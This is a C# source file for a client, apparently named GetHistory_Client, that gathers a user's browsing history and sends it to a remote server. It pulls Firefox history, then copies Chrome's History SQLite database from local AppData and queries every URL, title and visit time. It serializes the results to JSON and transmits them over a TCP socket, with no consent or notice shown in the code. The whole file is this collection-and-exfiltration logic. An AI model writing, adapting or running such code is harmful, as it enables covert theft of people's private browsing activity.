using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Data.SQLite;
using System.Data;
using System.Text.Json;

namespace GetHistory_Client
{
    public class Client
    {
        public string ipAddr { get; set; }
        public int port { get; set; }
        public Socket socket { get; set; }
        public IPEndPoint iPEndPoint { get; set; }
        public int ID { get; set; }

        public Client(string ipadres, int port)
        {
            this.ipAddr = ipadres;
            this.port = port;
            CreateSocet();

        }

        public Client(string ipadres, int port, Socket socet)
        {
            this.ipAddr = ipadres;
            this.port = port;
            this.socket = socet;

        }


        public void CreateSocet()
        {
            this.socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        public void CreateIPEndPoint()
        {

            this.iPEndPoint = new IPEndPoint(IPAddress.Parse(this.ipAddr), this.port);

        }


        public void Conect()
        {
            this.socket.Connect(this.iPEndPoint);

        }

        public string TakeMSGFromServ()
        {
            StringBuilder stringBuilder = new StringBuilder();
            int bytes = 0;

            byte[] data = new byte[250];

            do
            {
                bytes = this.socket.Receive(data);
                stringBuilder.Append(Encoding.Unicode.GetString(data, 0, bytes));
            } while (this.socket.Available > 0);

            return (stringBuilder.ToString());
        }


        public void SengMsg(string msg)
        {
            this.socket.Send(Encoding.Unicode.GetBytes(msg));
        }

        public void GetAndSendHistoryToServ()
        {
            string json = string.Empty;
            Firefox firefox = new Firefox();
            List<URL> firefoxlURL = new List<URL>();
            firefoxlURL.AddRange(firefox.GetHistory());
            json = JsonSerializer.Serialize<List<URL>>(firefoxlURL);
            this.SengMsg(json);
            string chromeHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
            if (!File.Exists("History"))
            {
                File.Copy(chromeHistoryFile, "History");
            }
            List<HistoryItem> allHistoryItems = new List<HistoryItem>();
            if (File.Exists("History"))
            {
               
                SQLiteConnection connection = new SQLiteConnection
                ("Data Source=" + "History" + ";Version=3;New=False;Compress=True;");
                connection.Open();
                DataSet dataset = new DataSet();
                SQLiteDataAdapter adapter = new SQLiteDataAdapter
                ("select * from urls order by last_visit_time desc", connection);
                adapter.Fill(dataset);
                if (dataset != null && dataset.Tables.Count > 0 & dataset.Tables[0] != null)
                {
                    DataTable dt = dataset.Tables[0];
                   
                    foreach (DataRow historyRow in dt.Rows)
                    {
                        HistoryItem historyItem = new HistoryItem()
                        {
                            URL = Convert.ToString(historyRow["url"]),
                            Title = Convert.ToString(historyRow["title"])

                        };
                        // Chrome stores time elapsed since Jan 1, 1601 (UTC format) in microseconds
                        long utcMicroSeconds = Convert.ToInt64(historyRow["last_visit_time"]);
                        // Windows file time UTC is in nanoseconds, so multiplying by 10
                        DateTime gmtTime = DateTime.FromFileTimeUtc(10 * utcMicroSeconds);
                        // Converting to local time
                        DateTime localTime = TimeZoneInfo.ConvertTimeFromUtc(gmtTime, TimeZoneInfo.Local);
                        historyItem.VisitedTime = localTime;
                        allHistoryItems.Add(historyItem);
                    }


                }
               
            }
            json = JsonSerializer.Serialize<List<HistoryItem>>(allHistoryItems);
            this.SengMsg(json);
        }
    }
}